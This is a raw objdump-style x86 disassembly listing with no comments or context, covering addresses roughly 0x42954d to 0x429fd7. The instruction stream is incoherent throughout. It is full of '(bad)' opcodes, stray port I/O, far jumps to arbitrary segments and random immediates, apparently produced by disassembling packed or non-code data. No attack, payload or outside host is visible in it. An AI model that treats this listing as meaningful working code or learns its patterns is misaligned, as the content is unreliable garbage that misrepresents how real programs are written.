  42954d:	cs jbe 0x4294f9
  429550:	mov    dl,0x97
  429552:	xchg   ebx,ebx
  429554:	mov    ecx,DWORD PTR [eax+ecx*2-0x21]
  429558:	js     0x4294f2
  42955a:	sub    ah,cl
  42955c:	jg     0x42955c
  42955e:	xchg   ecx,eax
  42955f:	(bad)  
  429560:	xor    cl,BYTE PTR [edi-0xd333b9f]
  429566:	loopne 0x429569
  429568:	pop    ds
  429569:	or     ah,dh
  42956b:	icebp  
  42956c:	adc    BYTE PTR [eax],ah
  42956e:	jb     0x4295b1
  429570:	jg     0x42954f
  429572:	jo     0x4294f4
  429574:	aas    
  429575:	dec    ecx
  429576:	loope  0x4295b3
  429578:	loope  0x4295ab
  42957a:	jmp    0x429504
  42957c:	sub    eax,0xf3f4df3b
  429581:	pop    esi
  429582:	pop    esi
  429583:	shl    esi,1
  429585:	or     edx,esi
  429587:	out    0xf,al
  429589:	jp     0x4295dc
  42958b:	cmp    al,0x7f
  42958d:	or     BYTE PTR [esi+0x47],0xd5
  429591:	je     0x4295d1
  429593:	je     0x429567
  429595:	and    al,0xcb
  429597:	retf   
  429598:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429599:	add    ah,ch
  42959b:	sub    al,0x53
  42959d:	repnz mov bl,0x42
  4295a0:	sahf   
  4295a1:	or     edi,edx
  4295a3:	pop    ss
  4295a4:	xchg   ebx,eax
  4295a5:	mov    cl,0x38
  4295a7:	leave  
  4295a8:	pop    ss
  4295a9:	call   0x5713c273
  4295ae:	sbb    cl,cl
  4295b0:	xchg   esp,eax
  4295b1:	mov    DWORD PTR [ecx],0xa85a3757
  4295b7:	push   es
  4295b8:	jae    0x429639
  4295ba:	jnp    0x429555
  4295bc:	sub    eax,eax
  4295be:	mov    al,gs:0x13b103e7
  4295c4:	rcl    BYTE PTR [edi+0xd37c59f],0x9b
  4295cb:	adc    al,BYTE PTR [eax+edx*2]
  4295ce:	pop    ebx
  4295cf:	mov    edx,0x413f5cde
  4295d4:	inc    esi
  4295d5:	sub    esi,ebx
  4295d7:	cdq    
  4295d8:	jecxz  0x42955f
  4295da:	jae    0x4295bc
  4295dc:	pop    ss
  4295dd:	loope  0x429565
  4295df:	fdivr  DWORD PTR [esi]
  4295e1:	xor    al,0x17
  4295e3:	test   al,0xd0
  4295e5:	dec    ebx
  4295e6:	and    eax,0xdf4aaa8c
  4295eb:	repz dec DWORD PTR [edx]
  4295ee:	test   BYTE PTR [eax+0x3c2f8613],0xa8
  4295f5:	shl    DWORD PTR [eax],cl
  4295f7:	lods   eax,DWORD PTR ds:[esi]
  4295f8:	in     eax,dx
  4295f9:	add    DWORD PTR [eax+0x47],ecx
  4295fc:	aam    0x30
  4295fe:	ret    
  4295ff:	lock cs mov ebp,0xd54031ca
  429606:	jle    0x429599
  429608:	call   0xcc97a829
  42960d:	xchg   edi,eax
  42960e:	test   al,0x15
  429610:	shl    BYTE PTR [ebx+0x133eb10e],1
  429616:	adc    ecx,DWORD PTR [edx+0x45]
  429619:	mov    ebx,0x8216b76
  42961e:	and    DWORD PTR [edi+0x5f],ebx
  429621:	loope  0x42960b
  429623:	ss pop ecx
  429625:	fnstsw WORD PTR [edi-0x17]
  429628:	in     eax,dx
  429629:	mov    ah,0x87
  42962b:	xchg   ebx,eax
  42962c:	sahf   
  42962d:	stc    
  42962e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42962f:	mov    ds:0xe9dd39ef,eax
  429634:	mov    al,0xd5
  429636:	mov    esp,0xbdf19d9b
  42963b:	(bad)  
  42963d:	xlat   BYTE PTR ds:[ebx]
  42963e:	stc    
  42963f:	loope  0x429693
  429641:	pop    edi
	...
  4296b2:	add    BYTE PTR [eax],al
  4296b4:	push   esi
  4296b5:	pop    ebx
  4296b6:	xor    al,0x78
  4296b8:	cmp    eax,0x737f5e7f
  4296bd:	ficom  DWORD PTR [ecx+0x4f]
  4296c0:	sbb    eax,0xfebc5dc5
  4296c5:	mov    bh,0x1
  4296c7:	add    dh,dh
  4296c9:	add    BYTE PTR [eax],al
  4296cb:	add    BYTE PTR [edx],dh
  4296cd:	fdivr  DWORD PTR [esi+0x5651798a]
  4296d3:	xchg   edx,ebp
  4296d5:	add    al,0x69
  4296d7:	sti    
  4296d8:	cli    
  4296d9:	xlat   BYTE PTR ds:[ebx]
  4296da:	add    eax,0xf1022bb4
  4296df:	dec    ebp
  4296e0:	sahf   
  4296e1:	dec    edi
  4296e2:	(bad)  
  4296e3:	cmc    
  4296e4:	sub    BYTE PTR [eax],bl
  4296e6:	les    edi,FWORD PTR [edx]
  4296e8:	stos   BYTE PTR es:[edi],al
  4296e9:	push   cs
  4296ea:	inc    ebx
  4296eb:	std    
  4296ec:	jae    0x42972a
  4296ee:	xor    ebp,DWORD PTR [edx+0x4d44a1bd]
  4296f4:	(bad)  
  4296f5:	xor    bh,BYTE PTR [eax-0x6c7d08e8]
  4296fb:	xchg   edi,eax
  4296fc:	pop    edx
  4296fd:	leave  
  4296fe:	jns    0x4296e3
  429700:	out    dx,al
  429701:	sub    eax,0x9adab461
  429706:	into   
  429707:	or     dh,bl
  429709:	inc    BYTE PTR [esi-0x47d53a31]
  42970f:	lahf   
  429710:	push   ecx
  429711:	push   cs
  429712:	add    edx,DWORD PTR [esi]
  429714:	push   es
  429715:	icebp  
  429716:	inc    ebx
  429717:	fadd   QWORD PTR ds:0xef03feb0
  42971d:	lods   al,BYTE PTR ds:[esi]
  42971e:	aam    0xf8
  429720:	cs out dx,al
  429722:	mov    dh,0x8f
  429724:	jmp    0xf66b5d99
  429729:	xchg   edx,eax
  42972a:	lahf   
  42972b:	dec    ebp
  42972c:	or     ebp,0x5c
  42972f:	sbb    esi,esp
  429731:	nop
  429732:	sub    eax,0xdee4567e
  429737:	jp     0x4296bd
  429739:	cli    
  42973a:	inc    edx
  42973b:	lock mov BYTE PTR [ebx+0x14],ch
  42973f:	xlat   BYTE PTR ds:[ebx]
  429740:	push   ebx
  429741:	nop
  429742:	mov    dh,bh
  429744:	add    ch,BYTE PTR [ebx+0x7e]
  429747:	xchg   ebx,eax
  429748:	test   eax,0xc9249ab9
  42974d:	mov    fs,WORD PTR [ecx+0x2a195897]
  429753:	fmul   DWORD PTR [eax+edx*1-0x76bee22]
  42975a:	mov    ds,WORD PTR [edi-0x2d69ce8b]
  429760:	test   BYTE PTR [ebp+0x10da2c5f],cl
  429766:	shr    BYTE PTR [ebx],1
  429768:	scas   eax,DWORD PTR es:[edi]
  429769:	xor    eax,0x746b3e1b
  42976e:	sbb    BYTE PTR [eax-0x3e],dh
  429771:	lods   al,BYTE PTR ds:[esi]
  429772:	lods   al,BYTE PTR ds:[esi]
  429773:	mov    ds:0x13563b15,eax
  429778:	int    0xda
  42977a:	sub    dh,BYTE PTR [ecx-0x35]
  42977d:	cli    
  42977e:	xor    eax,0x3c1cc6fd
  429783:	cmp    al,0xf6
  429785:	stos   BYTE PTR es:[edi],al
  429786:	inc    eax
  429787:	std    
  429788:	mov    bh,0xe
  42978a:	pop    edx
  42978b:	cld    
  42978c:	inc    esi
  42978d:	aaa    
  42978e:	cli    
  42978f:	out    0xdd,al
  429791:	pop    ecx
  429792:	nop
  429793:	xchg   ecx,eax
  429794:	mov    ebx,0x9fe93769
  429799:	pop    es
  42979a:	jmp    0x7fe67ced
  42979f:	jne    0x4297ce
  4297a1:	jns    0x4297fe
  4297a3:	loope  0x4297bd
  4297a5:	inc    esi
  4297a6:	fimul  WORD PTR [esi]
  4297a8:	(bad)  
  4297a9:	cli    
  4297aa:	mov    ebp,0x14729c0c
  4297af:	jecxz  0x4297c6
  4297b1:	stos   DWORD PTR es:[edi],eax
  4297b2:	or     DWORD PTR [edi+0x29b5671b],0x38
  4297b9:	sub    al,0x67
  4297bb:	in     al,0x16
  4297bd:	out    dx,al
  4297be:	fwait
  4297bf:	cs iret 
  4297c1:	scas   al,BYTE PTR es:[edi]
	...
  429832:	add    BYTE PTR [eax],al
  429834:	es jp  0x4298a8
  429837:	les    edi,FWORD PTR [ebp-0x31]
  42983a:	mov    bh,0xfa
  42983c:	push   0xffffffa8
  42983e:	push   es
  42983f:	adc    esp,esi
  429841:	dec    esi
  429842:	in     eax,0x64
  429844:	hlt    
  429845:	mov    eax,0xf60001
  42984a:	add    BYTE PTR [eax],al
  42984c:	cmp    DWORD PTR [edx-0x255044ee],eax
  429852:	ins    DWORD PTR es:[edi],dx
  429853:	jge    0x429842
  429855:	sub    DWORD PTR [ecx+0x3f],eax
  429858:	mov    ah,0x16
  42985a:	jp     0x4297f4
  42985c:	mov    al,ds:0xdbc2e983
  429861:	mov    ebp,0x902e42b3
  429866:	push   0x8f1c899f
  42986b:	sub    ebp,DWORD PTR [ebp-0x352094a2]
  429871:	sub    al,0xbd
  429873:	cmp    eax,0xdd3ed88c
  429878:	sub    DWORD PTR [edi+0x63],edi
  42987b:	(bad)  
  42987c:	pop    ebx
  42987d:	lock retf 0xf23f
  429881:	inc    ebx
  429882:	sub    esp,DWORD PTR [ecx]
  429884:	dec    bh
  429886:	mov    BYTE PTR [esi-0x23],al
  429889:	fcom   DWORD PTR [ecx-0x7]
  42988c:	ja     0x42989e
  42988e:	neg    DWORD PTR [eax]
  429890:	sbb    BYTE PTR [edx-0x43],bh
  429893:	ds push cs
  429895:	cmp    ebp,DWORD PTR [eax+0x366fcf65]
  42989b:	shr    DWORD PTR [ebp+0x51],cl
  42989e:	mov    dh,0x31
  4298a0:	loop   0x429852
  4298a2:	jl     0x429846
  4298a4:	inc    BYTE PTR [si-0x6043]
  4298a9:	cmp    bl,cl
  4298ab:	sub    DWORD PTR [eax],esp
  4298ad:	cmp    al,0x84
  4298af:	xor    edx,edx
  4298b1:	xlat   BYTE PTR ds:[ebx]
  4298b2:	push   edi
  4298b3:	push   es
  4298b4:	xor    eax,0xe7736159
  4298b9:	jae    0x4298fa
  4298bb:	das    
  4298bc:	ja     0x42991f
  4298be:	fisubr DWORD PTR [edx]
  4298c0:	repz pop ebp
  4298c2:	push   edx
  4298c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4298c4:	jecxz  0x4298b5
  4298c6:	xchg   edx,eax
  4298c7:	lock inc ebp
  4298c9:	retf   0xd57
  4298cc:	jecxz  0x4298c1
  4298ce:	popf   
  4298cf:	mov    BYTE PTR [esi+0x5b049335],0x40
  4298d6:	and    dl,BYTE PTR [esi]
  4298d8:	pop    edx
  4298d9:	cwde   
  4298da:	jno    0x42991d
  4298dc:	dec    DWORD PTR [ebx+ebp*1]
  4298df:	or     al,0x64
  4298e1:	jns    0x429928
  4298e3:	cmp    al,dh
  4298e5:	(bad)  
  4298e7:	lock or eax,0x564afac1
  4298ed:	inc    esp
  4298ee:	lahf   
  4298ef:	jae    0x429871
  4298f1:	pop    ecx
  4298f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4298f3:	mov    esi,0x4b7572fc
  4298f8:	out    0xb,eax
  4298fa:	or     eax,DWORD PTR [eax]
  4298fc:	pusha  
  4298fd:	xor    BYTE PTR [edi-0x7],bh
  429900:	sti    
  429901:	loope  0x4298a7
  429903:	cs nop
  429905:	pop    ds
  429906:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429907:	in     eax,0x6e
  429909:	retf   0xcd9f
  42990c:	clc    
  42990d:	call   0x738bad08
  429912:	fcom   DWORD PTR ds:0x7f53c80c
  429918:	cmp    al,0xad
  42991a:	lods   al,BYTE PTR ds:[esi]
  42991b:	pop    edx
  42991c:	or     DWORD PTR [ecx+ecx*2+0x29],esi
  429920:	xor    eax,edx
  429922:	lds    esp,FWORD PTR [ebp-0x5dd8d4ce]
  429928:	sahf   
  429929:	xchg   esp,eax
  42992a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42992b:	mov    ecx,0x8a269ce5
  429930:	xchg   edx,eax
  429931:	xchg   ecx,eax
  429932:	les    ebp,FWORD PTR [edi]
  429934:	loopne 0x429955
  429936:	std    
  429937:	(bad)  
  429938:	(bad)  [edx]
  42993a:	push   ebx
  42993b:	lods   al,BYTE PTR ds:[esi]
  42993c:	xchg   ebx,eax
  42993d:	cmp    al,0x8d
  42993f:	(bad)  
  429940:	or     al,BYTE PTR ds:0x0
	...
  4299b2:	add    BYTE PTR [eax],al
  4299b4:	dec    ebp
  4299b5:	or     al,0xf8
  4299b7:	pop    ebx
  4299b8:	stc    
  4299b9:	(bad)  
  4299ba:	out    dx,eax
  4299bb:	push   ds
  4299bc:	ins    BYTE PTR es:[edi],dx
  4299bd:	xchg   ecx,eax
  4299be:	cld    
  4299bf:	sub    DWORD PTR [ecx+0x6c],ebx
  4299c2:	and    eax,0x1b9eac8
  4299c7:	add    dh,dh
  4299c9:	add    BYTE PTR [eax],al
  4299cb:	add    BYTE PTR [ecx+ecx*1],al
  4299ce:	mov    dh,0xcd
  4299d0:	mov    ecx,DWORD PTR ds:0x1ae70b79
  4299d6:	pop    edx
  4299d7:	jnp    0x429a36
  4299d9:	xchg   esi,eax
  4299da:	mov    ?,WORD PTR ds:0x69ed7979
  4299e0:	test   DWORD PTR [esi+0x2c9090a8],eax
  4299e6:	into   
  4299e7:	pop    esp
  4299e8:	adc    edi,DWORD PTR [edx-0x4]
  4299eb:	mov    esi,edi
  4299ed:	mov    ah,0xbd
  4299ef:	add    eax,0x890263bb
  4299f4:	fwait
  4299f5:	js     0x4299a3
  4299f7:	jo     0x429a64
  4299f9:	push   ds
  4299fa:	cmp    bh,BYTE PTR [ebx+0x3d]
  4299fd:	(bad)  
  4299fe:	jb     0x429a3f
  429a00:	sbb    ah,BYTE PTR [esi+0x78a9ed84]
  429a06:	sub    al,0xf9
  429a08:	into   
  429a09:	mov    esp,DWORD PTR [edx+eax*1-0x75]
  429a0d:	popa   
  429a0e:	adc    esp,esp
  429a10:	pop    ecx
  429a11:	or     dh,BYTE PTR [ebx]
  429a13:	sti    
  429a14:	call   0x383e:0xea0f19e7
  429a1b:	pop    edi
  429a1c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429a1d:	xor    eax,0x4346a00d
  429a22:	pushf  
  429a23:	fisub  DWORD PTR [esi-0x55566a68]
  429a29:	mov    bl,0x7e
  429a2b:	adc    al,0x8e
  429a2d:	dec    eax
  429a2e:	inc    edi
  429a2f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429a30:	ret    
  429a31:	jle    0x4299d0
  429a33:	push   0x45d32385
  429a38:	sub    al,0x70
  429a3a:	iret   
  429a3b:	fnstsw WORD PTR fs:[ecx-0x3ea1fe2d]
  429a42:	and    BYTE PTR [ebp+0x58bde222],ah
  429a48:	mov    bl,BYTE PTR [ecx+0x660a59c8]
  429a4e:	test   al,0xf8
  429a50:	dec    ebx
  429a51:	sahf   
  429a52:	mov    edi,0x7dc8d8e8
  429a57:	out    0xe7,eax
  429a59:	jl     0x429a28
  429a5b:	outs   dx,DWORD PTR ds:[esi]
  429a5c:	pop    ebp
  429a5d:	push   0xf
  429a5f:	aad    0x1c
  429a61:	dec    edx
  429a62:	jne    0x4299e6
  429a64:	je     0x429acf
  429a66:	cmp    BYTE PTR [ecx-0x34],0x9a
  429a6a:	add    eax,0xa1f522fb
  429a6f:	mov    esp,0x1dacc33b
  429a74:	and    ebp,ecx
  429a76:	std    
  429a77:	and    DWORD PTR [edi-0x634bb4b8],ebp
  429a7d:	xchg   edi,eax
  429a7e:	pop    ecx
  429a7f:	push   0xffffffc5
  429a81:	jl     0x429a61
  429a83:	pop    ds
  429a84:	or     BYTE PTR [ebp-0x18],ah
  429a87:	icebp  
  429a88:	(bad)  
  429a89:	repz push DWORD PTR ds:0x16081919
  429a90:	pusha  
  429a91:	aas    
  429a92:	loop   0x429aa0
  429a94:	sbb    al,0xe1
  429a96:	dec    esi
  429a97:	sub    eax,0xe73c698
  429a9c:	scas   eax,DWORD PTR es:[edi]
  429a9d:	xlat   BYTE PTR ds:[ebx]
  429a9e:	push   cs
  429a9f:	ret    0x6b48
  429aa2:	lds    esi,FWORD PTR [ecx+0x3a94c90f]
  429aa8:	sti    
  429aa9:	and    DWORD PTR [ebx],eax
  429aab:	lahf   
  429aac:	clc    
  429aad:	in     al,0x68
  429aaf:	cli    
  429ab0:	gs je  0x429a71
  429ab3:	sub    eax,0xd536a4eb
  429ab8:	mov    bl,0x1e
  429aba:	adc    ecx,DWORD PTR [ecx+0x7eae2d3a]
  429ac0:	stos   DWORD PTR es:[edi],eax
  429ac1:	dec    edx
	...
  429b32:	add    BYTE PTR [eax],al
  429b34:	lds    edx,FWORD PTR [ebp-0x76]
  429b37:	cli    
  429b38:	call   0xe133:0xa97ff5ff
  429b3f:	ret    0x6595
  429b42:	push   esi
  429b43:	ins    BYTE PTR es:[edi],dx
  429b44:	loopne 0x429b00
  429b46:	add    DWORD PTR [eax],eax
  429b48:	test   BYTE PTR [eax],0x0
  429b4b:	add    BYTE PTR [edi-0x55810d7b],cl
  429b51:	test   eax,0x52c209a0
  429b56:	daa    
  429b57:	jp     0x429afa
  429b59:	adc    BYTE PTR [edx],al
  429b5b:	push   ebx
  429b5c:	push   edi
  429b5d:	ret    0xc012
  429b60:	cmp    BYTE PTR [ebx-0x35],bh
  429b63:	in     al,dx
  429b64:	fucom  st(6)
  429b66:	mov    cl,0xc8
  429b68:	and    eax,ecx
  429b6a:	test   edi,esi
  429b6c:	cmp    bl,BYTE PTR [eax+0x2fd23d5]
  429b72:	aaa    
  429b73:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429b74:	sbb    al,0x84
  429b76:	stos   DWORD PTR es:[edi],eax
  429b77:	fsubr  QWORD PTR [esi-0x6d]
  429b7a:	jmp    0x5cec01fa
  429b7f:	jne    0x429bbb
  429b81:	push   ss
  429b82:	ss dec eax
  429b84:	int    0xba
  429b86:	fdiv   DWORD PTR [ebp+0x60]
  429b89:	in     eax,dx
  429b8a:	mov    al,0x54
  429b8c:	out    0x25,eax
  429b8e:	push   edx
  429b8f:	out    0x6d,al
  429b91:	add    DWORD PTR [ebp-0x3b],0x3d62a280
  429b98:	push   es
  429b99:	adc    BYTE PTR [ebp+0x4ba9e10a],dl
  429b9f:	aam    0x27
  429ba1:	inc    ecx
  429ba2:	jo     0x429b27
  429ba4:	xchg   DWORD PTR [edi-0x74afdf2],edx
  429baa:	in     eax,0x91
  429bac:	fist   DWORD PTR [edx]
  429bae:	pop    ecx
  429baf:	(bad)  
  429bb0:	jg     0x429bd9
  429bb2:	mov    al,0x97
  429bb4:	sub    esp,DWORD PTR [edx-0x6f6d8bfa]
  429bba:	pop    es
  429bbb:	adc    DWORD PTR [esi],edi
  429bbd:	push   edi
  429bbe:	push   ds
  429bbf:	idiv   al
  429bc1:	and    esi,DWORD PTR [esi-0x2d29034e]
  429bc7:	pop    esp
  429bc8:	add    DWORD PTR [edi],esp
  429bca:	xor    DWORD PTR [edi-0x62631d4c],0xbcf37f0c
  429bd4:	(bad)  
  429bd6:	cmp    ah,BYTE PTR [ebp+0x15d4c09e]
  429bdc:	stos   DWORD PTR es:[edi],eax
  429bdd:	add    BYTE PTR [edi],bl
  429bdf:	add    DWORD PTR [esi+0x645dc0a3],edi
  429be5:	adc    bh,BYTE PTR [ebx+ebp*8-0x14]
  429be9:	repz push edi
  429beb:	sbb    ebx,eax
  429bed:	mov    cl,0xa8
  429bef:	mov    bl,BYTE PTR [eax]
  429bf1:	jnp    0x429b99
  429bf3:	mov    al,0x2f
  429bf5:	or     ecx,ebx
  429bf7:	and    edi,DWORD PTR [eax+edi*4]
  429bfa:	push   ebx
  429bfb:	push   edi
  429bfc:	mov    cs,WORD PTR [ebx]
  429bfe:	mov    WORD PTR [edi],cs
  429c00:	pop    eax
  429c01:	in     eax,dx
  429c02:	mov    dl,0x75
  429c04:	or     BYTE PTR [eax],al
  429c06:	mov    dl,0x3a
  429c08:	pop    ebp
  429c09:	repz push ss
  429c0b:	jbe    0x429c37
  429c0d:	fldl2t 
  429c0f:	or     eax,0x88382375
  429c14:	fxch   st(5)
  429c16:	mov    DWORD PTR [edx+0x13],esp
  429c19:	fst    QWORD PTR [ecx-0x1d]
  429c1c:	enter  0x7745,0x2e
  429c20:	pop    edi
  429c21:	cmp    al,0x1c
  429c23:	jge    0x429ba6
  429c25:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429c26:	test   BYTE PTR [ebp-0x58],al
  429c29:	sub    al,0x8d
  429c2b:	sbb    eax,0x975278d9
  429c30:	fs xchg ecx,eax
  429c32:	outs   dx,BYTE PTR ds:[esi]
  429c33:	ret    0x3264
  429c36:	mov    edx,0x5bac4278
  429c3b:	je     0x429c7e
  429c3d:	xor    eax,0x4a65238c
	...
  429cb2:	add    BYTE PTR [eax],al
  429cb4:	xor    DWORD PTR [ebp+0x75f531f1],0xd7dfb5c1
  429cbe:	ins    BYTE PTR es:[edi],dx
  429cbf:	scas   al,BYTE PTR es:[edi]
  429cc0:	mov    cl,0xe6
  429cc3:	or     edx,esi
  429cc5:	mov    ebx,0xf60001
  429cca:	add    BYTE PTR [eax],al
  429ccc:	ret    0xb844
  429ccf:	jp     0x429c5d
  429cd1:	fstp   DWORD PTR [ebx]
  429cd3:	xchg   ecx,eax
  429cd4:	call   0x9ba5:0x67abed43
  429cdb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429cdc:	cmp    BYTE PTR [ecx-0x20],dh
  429cdf:	repz adc DWORD PTR [ebp-0x16696969],esi
  429ce6:	pop    es
  429ce7:	les    esi,FWORD PTR [ecx]
  429ce9:	scas   al,BYTE PTR es:[edi]
  429cea:	adc    cl,BYTE PTR [ebx]
  429cec:	inc    edx
  429ced:	xor    DWORD PTR [esi-0x2b049447],esi
  429cf3:	add    dh,bl
  429cf5:	cli    
  429cf6:	xchg   edx,eax
  429cf7:	jns    0x429d22
  429cf9:	xchg   ebp,eax
  429cfa:	ror    BYTE PTR [ecx],cl
  429cfc:	sub    bh,BYTE PTR [eax+0x2dc9d17c]
  429d02:	add    bl,BYTE PTR [ecx]
  429d04:	cmp    ebx,ebx
  429d06:	inc    esp
  429d07:	lods   al,BYTE PTR ds:[esi]
  429d08:	xor    cl,BYTE PTR [ecx+0x11]
  429d0b:	ins    BYTE PTR es:[edi],dx
  429d0c:	mov    esp,0x6cca81a5
  429d11:	stc    
  429d12:	xlat   BYTE PTR ds:[ebx]
  429d13:	fs stos DWORD PTR es:[edi],eax
  429d15:	xor    BYTE PTR [ecx-0x57d5c42],dh
  429d1b:	jnp    0x429d50
  429d1d:	mov    bh,0xe
  429d1f:	call   0x1ab97d80
  429d24:	mov    ah,0x6d
  429d26:	nop
  429d27:	sbb    BYTE PTR [esi+0x5ad1c78],cl
  429d2d:	xchg   edx,eax
  429d2e:	pop    ds
  429d2f:	sub    DWORD PTR [ebx+esi*8+0x34bc957e],ebp
  429d36:	ror    dl,0xc9
  429d39:	(bad)  
  429d3a:	lds    edx,FWORD PTR [edi+0x52]
  429d3d:	adc    cl,BYTE PTR [ecx-0x61bff7f3]
  429d43:	out    0x15,al
  429d45:	and    ah,BYTE PTR [ebx+0x20]
  429d48:	test   DWORD PTR [esi+0x6620238],ecx
  429d4e:	pop    esi
  429d4f:	stc    
  429d50:	leave  
  429d51:	xor    ecx,edi
  429d53:	and    eax,0xfdc218fc
  429d58:	or     BYTE PTR [edi+esi*8],cl
  429d5b:	sub    al,0xb3
  429d5d:	arpl   WORD PTR [eax],bx
  429d5f:	or     bl,BYTE PTR [edx+0x63]
  429d62:	lahf   
  429d63:	mov    ebx,0x35454b11
  429d68:	cmp    dl,bl
  429d6a:	retf   0xd998
  429d6d:	repnz stos BYTE PTR es:[edi],al
  429d6f:	rol    DWORD PTR [eax-0x1d1eb39f],1
  429d75:	dec    ecx
  429d76:	push   ss
  429d77:	retf   0x9805
  429d7a:	(bad)  
  429d7b:	(bad)  
  429d7c:	cmp    al,0xf1
  429d7e:	ss (bad) 
  429d80:	xor    BYTE PTR [edi+0x402bf20d],ch
  429d86:	and    al,0xa2
  429d88:	pop    ds
  429d89:	je     0x429d73
  429d8b:	enter  0x3f10,0x64
  429d8f:	shr    DWORD PTR [esi-0xe2dedb1],0x61
  429d96:	cli    
  429d97:	dec    ebx
  429d98:	gs in  al,dx
  429d9a:	fist   DWORD PTR [ecx+0x51]
  429d9d:	mov    DWORD PTR [esi+edi*1],ecx
  429da0:	adc    ch,BYTE PTR [ecx-0x4065ac4a]
  429da6:	dec    esi
  429da7:	and    al,0x94
  429da9:	popf   
  429daa:	jle    0x429d6e
  429dac:	push   ebp
  429dad:	jo     0x429e20
  429daf:	and    eax,0x2026090a
  429db4:	fsubr  st,st(0)
  429db6:	cmp    al,0x53
  429db8:	dec    eax
  429db9:	in     al,dx
  429dba:	sti    
  429dbb:	shr    BYTE PTR [edi],1
  429dbd:	xchg   esi,eax
  429dbe:	xor    DWORD PTR [ecx+0x22b9],esp
	...
  429e34:	dec    edi
  429e35:	pop    ebp
  429e36:	pop    ecx
  429e37:	sbb    DWORD PTR [ebx-0x79],0xffffffdf
  429e3b:	fstp   QWORD PTR [eax+0x2d4e2ee0]
  429e41:	dec    edx
  429e42:	jmp    0xf600:0x1bcccca
  429e49:	add    BYTE PTR [eax],al
  429e4b:	add    BYTE PTR [ebx+0x39],ah
  429e4e:	and    ah,BYTE PTR [ebp-0x6eef3006]
  429e54:	xor    BYTE PTR [ebx+0x2b],bh
  429e57:	push   ss
  429e58:	jge    0x429df9
  429e5a:	xor    eax,0x23eae2cf
  429e5f:	dec    esp
  429e60:	jae    0x429ed1
  429e62:	dec    ebx
  429e63:	les    esi,FWORD PTR [esi+0x55]
  429e66:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429e67:	add    al,dh
  429e69:	stc    
  429e6a:	fisub  WORD PTR [eax]
  429e6c:	xchg   ebx,eax
  429e6d:	jns    0x429ed3
  429e6f:	and    al,BYTE PTR ds:0x46cc8b56
  429e75:	and    BYTE PTR [edx],0x22
  429e78:	mov    ds:0xb1935c27,eax
  429e7d:	sub    al,al
  429e7f:	inc    esi
  429e80:	fucomip st,st(3)
  429e82:	sahf   
  429e83:	xor    dl,BYTE PTR [eax]
  429e85:	repnz lods eax,DWORD PTR ds:[esi]
  429e87:	in     al,dx
  429e88:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429e89:	adc    eax,0xa7342e47
  429e8e:	sub    eax,0xce22d4da
  429e93:	fmul   QWORD PTR [edi-0x1a]
  429e96:	div    dl
  429e98:	sbb    ecx,DWORD PTR [ebx]
  429e9a:	(bad)  
  429e9b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429e9c:	mov    cl,0x80
  429e9e:	lds    ecx,FWORD PTR [edi]
  429ea0:	(bad)  
  429ea1:	mov    eax,ds:0x6e30055
  429ea6:	shl    BYTE PTR [edi+0x77bddef5],0xd6
  429ead:	add    al,0xbf
  429eaf:	repz jmp 0x9df3:0xf7c5d42a
  429eb7:	cli    
  429eb8:	push   0x298aafd6
  429ebd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429ebe:	adc    BYTE PTR [esi-0x6151d77e],bh
  429ec4:	jb     0x429e57
  429ec6:	sub    BYTE PTR [eax],dh
  429ec8:	push   eax
  429ec9:	clc    
  429eca:	daa    
  429ecb:	jge    0x429e7a
  429ecd:	cli    
  429ece:	mov    al,ds:0xd7db2d60
  429ed3:	leave  
  429ed4:	stos   DWORD PTR es:[edi],eax
  429ed5:	add    bh,cl
  429ed7:	jnp    0x429e8b
  429ed9:	je     0x429e77
  429edb:	imul   edi,DWORD PTR [bp+di-0x65],0xffffffa3
  429ee0:	jmp    0x8d3bfc37
  429ee5:	sar    BYTE PTR [esi+0x63],cl
  429ee8:	jmp    0x6f1c:0xf952dd67
  429eef:	xchg   edx,eax
  429ef0:	xchg   ebx,eax
  429ef1:	fidiv  DWORD PTR [edi-0x73509c47]
  429ef7:	popf   
  429ef8:	ds add eax,0x1d58e509
  429efe:	pop    ebx
  429eff:	das    
  429f00:	add    bh,ah
  429f02:	add    DWORD PTR [esi+0x32b9b0c0],esi
  429f08:	ss (bad) 
  429f0a:	cmp    BYTE PTR [edx],bh
  429f0c:	mov    bh,0x35
  429f0e:	fwait
  429f0f:	cmp    BYTE PTR [edx+ebp*1-0x22c10f18],bl
  429f16:	mov    bh,0x7b
  429f18:	loopne 0x429eee
  429f1a:	xchg   DWORD PTR [ebx-0xa],eax
  429f1d:	inc    eax
  429f1e:	mov    esi,cs
  429f20:	sahf   
  429f21:	call   FWORD PTR [ebp+0x4d]
  429f24:	addr16 dec esi
  429f26:	scas   al,BYTE PTR es:[edi]
  429f27:	add    edx,DWORD PTR [ebp-0x2d]
  429f2a:	inc    edi
  429f2b:	push   ds
  429f2c:	ret    
  429f2d:	mov    ebp,0x5ff3566b
  429f32:	div    BYTE PTR [esi+0x42]
  429f35:	rol    BYTE PTR [ecx+0x35],cl
  429f38:	inc    edx
  429f39:	mov    eax,0x377f5d3b
  429f3e:	cwde   
  429f3f:	popf   
  429f40:	pushf  
  429f41:	mov    al,0x0
	...
  429fb3:	add    cl,ah
  429fb5:	in     al,dx
  429fb6:	mov    ebx,es
  429fb8:	(bad)  
  429fb9:	jecxz  0x429faa
  429fbb:	out    dx,al
  429fbc:	sub    dh,BYTE PTR [eax+0x252d6d7b]
  429fc2:	cli    
  429fc3:	in     eax,0xc2
  429fc5:	mov    ebp,0xf60001
  429fca:	add    BYTE PTR [eax],al
  429fcc:	sbb    edi,DWORD PTR [esi-0x10]
  429fcf:	sbb    BYTE PTR [eax-0x567e4ab8],ah
  429fd5:	and    eax,esi
  429fd7:	push   0x9d7480b1
